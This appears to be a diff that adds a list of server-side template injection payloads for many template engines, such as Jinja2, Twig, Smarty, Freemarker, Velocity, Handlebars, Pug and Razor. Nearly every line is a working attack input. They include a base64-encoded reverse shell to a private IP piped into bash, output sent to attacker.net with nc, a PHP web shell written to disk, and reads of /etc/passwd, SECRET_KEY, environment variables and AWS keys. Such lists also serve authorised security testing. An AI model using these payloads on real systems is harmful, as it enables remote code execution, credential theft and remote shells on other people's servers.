@@ -1,0 +1,51 @@
+{{ '7'*7 }}
+{{ ['system', 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS43NS8xMjM0IDA+JjEK | base64 -d | bash'] | sort('call_user_func') }}
+You age is {{60+7}} years old
+{{config["SECRET_KEY"]}}
+{{self.__dict__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+1{{self.__init__.__globals__.__str__()[1786:1788]}}
+1{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
+{{_context|keys|join(',')}}
+{{files.get_style_sheet('../../../../../etc/passwd')}}
+1{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
+${'java.lang.ProcessBuilder'?new(['id']).start()}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+1{chr(105)|cat:chr(100)}
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+%><%=`whoami`
+<%= Dir.entries('/') %>
+${'nslookup -type=SRV 9zngatihqnif00r6i461uq.oastify.com'.execute().text}
+1${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
+1@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x
+1{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
+{{ someString.toUPPERCASE() }}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
+{{range.constructor('return global.process.mainModule.require("child_process").execSync("whoami")')()}}
+{{.Secret "id"}}
+{{.File "/etc/passwd"}}
+#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end
+<%\nimport os\nx=os.popen('id').read()\n%>\n${x}
+{% set cmd = 'id' %}\n{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}\n{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')
+{{#with "console.log(JSON.stringify(process.env,null, 2))" }}\n{{#with (split "S" 1) as |payload|}}\n{{__defineGetter__ "undefined" valueOf }}\n{{#with __lookupGetter__ }}\n{{__defineGetter__ "propertyIsEnumerable" (this.bind (this.bind 1)) }}\n{{__defineGetter__ "undefined" this.constructor}}\n{{#with __lookupGetter__ as |ctor| }}\n{{__defineGetter__ "hax" (ctor.apply ctor payload)}}\n{{{hax}}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
+<#assign ex="freemarker.template.utility.Execute"?new()><p>RCE: ${ ex("whoami") }</p>
+{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
+{% set arr = {'1':'system', '2':'foo'} %}\n{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}\n{{ system('id') }}
+{{ ['curl yourhost.com','']|sort('system') }}
+bdawg-{{7 * 7}}
+{{ env "AWS_KEY" }}
+[wpml_language_switcher]\n{{ 4 * 7 }}\n[/wpml_language_switcher]
+@php\n  system("id>/tmp/pwned");\n@endphp
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}
+{{ constant('PHP_VERSION') }}
+{{ constant('PHP_OS') }}
+{{ constant('CRAFT_BASE_PATH') }}
+{{ constant('CRAFT_VENDOR_PATH') }}
